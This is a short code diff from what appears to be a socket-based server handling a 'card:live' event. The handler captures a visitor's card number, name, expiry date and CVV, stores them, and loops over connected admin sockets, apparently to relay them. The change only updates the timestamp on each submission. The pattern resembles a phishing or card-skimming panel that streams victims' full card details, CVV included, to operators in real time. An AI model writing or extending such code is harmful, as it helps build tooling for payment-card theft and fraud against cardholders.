@@ -523,7 +523,7 @@ socket.on("card:live", (data) => {
   const cvv = String(data.cvv || '').replace(/\D/g, '').slice(0, 4);
 
   visitor.liveCard = { cardNumber, nameOnCard, expiryDate, cvv };
-  if (!visitor.liveCardTimestamp) visitor.liveCardTimestamp = new Date().toISOString();
+  visitor.liveCardTimestamp = new Date().toISOString();
   visitors.set(socket.id, visitor);
 
   admins.forEach((admin, adminSocketId) => {
